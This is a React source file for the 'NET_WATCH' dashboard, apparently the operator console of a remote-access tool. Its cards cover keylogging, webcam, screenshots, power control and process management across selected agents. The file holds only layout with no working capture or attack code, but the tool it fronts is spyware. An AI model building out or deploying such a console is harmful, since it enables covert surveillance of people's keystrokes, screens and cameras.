import { Terminal, ShieldCheck, Activity, Lock, Cpu } from 'lucide-react';
import PowerControls from './components/PowerControls';
import ProcessManager from './components/ProcessManager';
import ScreenshotCard from './components/ScreenshotCard';
import KeyloggerCard from './components/KeyloggerCard';
import AgentSelector from './components/AgentSelector';
import WebcamCard from './components/WebcamCard';
import { useSocket } from './contexts/SocketContext';

function App() {
    const { isSystemLocked, isConnected, selectAgent } = useSocket();

    return (
        <div className="min-h-screen bg-cyber-grid text-gray-300 font-mono selection:bg-cyber-yellow selection:text-black flex flex-col scanlines overflow-hidden">
            
            {/* --- TOP HUD BAR --- */}
            <header className="sticky top-0 z-50 bg-cyber-black/90 backdrop-blur border-b border-cyber-yellow/20 px-6 py-3 shadow-[0_5px_30px_rgba(0,0,0,0.8)]">
                <div className="container mx-auto flex flex-col lg:flex-row items-center justify-between gap-4">
                    
                    {/* LOGO AREA */}
                    <div className="flex items-center gap-4">
                        <div className="relative group cursor-pointer">
                            <div className="absolute inset-0 bg-cyber-yellow blur opacity-20 group-hover:opacity-40 transition-opacity"></div>
                            <div className="relative border border-cyber-yellow p-2 bg-black clip-path-polygon">
                                <Terminal className="w-8 h-8 text-cyber-yellow animate-pulse" />
                            </div>
                        </div>
                        <div>
                            <h1 className="text-3xl font-display font-black text-white tracking-tighter leading-none glitch" data-text="NET_WATCH">
                                NET_<span className="text-cyber-yellow">WATCH</span>
                            </h1>
                            <div className="flex items-center gap-2 text-[10px] text-cyber-blue font-mono tracking-widest">
                                <span>V.2.77</span>
                                <span className="w-1 h-1 bg-cyber-blue rounded-full"></span>
                                <span>UNAUTHORIZED ACCESS DETECTED</span>
                            </div>
                        </div>
                    </div>

                    {/* STATUS INDICATORS */}
                    <div className="flex items-center gap-6 font-mono text-xs">
                         <div className="flex items-center gap-2 text-cyber-red">
                             <ShieldCheck className="w-4 h-4" />
                             <span className="hidden md:inline">FIREWALL: BYPASSED</span>
                         </div>
                         <div className="flex items-center gap-2 text-cyber-blue">
                             <Activity className="w-4 h-4 animate-spin-slow" />
                             <span>UPLINK: {isConnected ? "ESTABLISHED" : "SEARCHING..."}</span>
                         </div>
                    </div>
                </div>
            </header>

            {/* --- MAIN DASHBOARD --- */}
            <main className="container mx-auto px-4 py-6 flex-1 flex flex-col gap-6 relative z-10">
                
                {/* Khu vực chọn Agent (Trên cùng) */}
                <div className="w-full">
                    <AgentSelector onSelectAgent={selectAgent} />
                </div>

                {/* Dashboard Grid Layout */}
                <div className="grid grid-cols-1 xl:grid-cols-12 gap-6 h-full">
                    
                    {/* CỘT TRÁI (3 phần) - Controls & Info */}
                    <div className="xl:col-span-3 flex flex-col gap-6">
                        <div className="flex-1 min-h-[300px]">
                            <PowerControls />
                        </div>
                        <div className="bg-cyber-dark border border-cyber-blue/20 p-4 clip-path-polygon">
                             <h4 className="text-cyber-blue text-xs mb-2 flex items-center gap-2">
                                <Cpu size={14} /> SYSTEM RESOURCES
                             </h4>
                             {/* Fake Charts */}
                             <div className="space-y-2">
                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-yellow w-[70%] animate-pulse"></div></div>
                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-blue w-[45%]"></div></div>
                                 <div className="h-1 w-full bg-gray-800 overflow-hidden"><div className="h-full bg-cyber-red w-[20%]"></div></div>
                             </div>
                        </div>
                    </div>

                    {/* CỘT GIỮA (6 phần) - Visuals (Cam & Screen) */}
                    <div className="xl:col-span-6 flex flex-col gap-6">
                        <div className="h-[300px]">
                             <ScreenshotCard />
                        </div>
                        <div className="h-[300px]">
                             <WebcamCard />
                        </div>
                    </div>

                    {/* CỘT PHẢI (3 phần) - Logs & Process */}
                    <div className="xl:col-span-3 flex flex-col gap-6">
                         <div className="flex-1 min-h-[400px]">
                             <KeyloggerCard />
                         </div>
                    </div>
                </div>

                {/* HÀNG DƯỚI CÙNG - Process Manager (Rộng toàn màn hình) */}
                <div className="w-full mt-auto">
                    <ProcessManager />
                </div>

            </main>

            {/* --- SYSTEM LOCK OVERLAY --- */}
            {isSystemLocked && (
                <div className="fixed inset-0 z-[9999] bg-black/95 flex flex-col items-center justify-center">
                    <div className="absolute inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20"></div>
                    <div className="relative border-2 border-cyber-red p-12 bg-black max-w-2xl w-full text-center shadow-[0_0_100px_rgba(255,0,60,0.5)] clip-path-polygon">
                        <Lock className="w-32 h-32 text-cyber-red mx-auto mb-6 animate-pulse" />
                        <h1 className="text-8xl font-display font-black text-cyber-red tracking-tighter mb-4 glitch">LOCKED</h1>
                        <p className="text-white font-mono text-xl tracking-[0.5em] uppercase border-y border-cyber-red/50 py-4">
                            Administrative Access Required
                        </p>
                    </div>
                </div>
            )}
        </div>
    );
}

export default App;